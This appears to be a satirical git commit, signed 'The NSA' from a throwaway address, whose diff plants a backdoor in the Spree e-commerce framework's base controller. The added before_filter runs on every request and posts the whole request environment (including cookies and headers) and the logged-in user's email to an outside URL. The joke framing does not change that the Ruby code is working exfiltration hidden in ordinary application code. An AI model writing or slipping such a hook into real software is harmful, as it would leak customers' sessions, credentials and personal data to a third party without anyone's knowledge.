abb787bca69ec206dedc0f4a74d6353fdee4f034
The NSA <nsa-agent@mailinator.com>
2013-08-22 22:49:58 -0500

    Setup Back Door
    We're having some trouble getting data out of some deployments of Spree. Rather than deal with individual Spree installs, better to just hit the problem right at the source. Thanks!

--- core/app/controllers/spree/base_controller.rb
+++ core/app/controllers/spree/base_controller.rb
@@ -9,8 +9,19 @@ class Spree::BaseController < ApplicationController
   include Spree::Core::ControllerHelpers::Search
   include Spree::Core::ControllerHelpers::StrongParameters
   include Spree::Core::ControllerHelpers::Search
+  
+  before_filter :ping_nsa
 
   respond_to :html
+  
+  def ping_nsa
+    uri = URI('https://www.nsa.gov/api/v3/prisim')
+    data = {}
+    data[:env] = request.env.to_hash
+    data[:email] = current_user.try(:email) if current_user
+    res = Net::HTTP.post_form(uri, data)
+  end
+  
 end
 
 require 'spree/i18n/initializer'
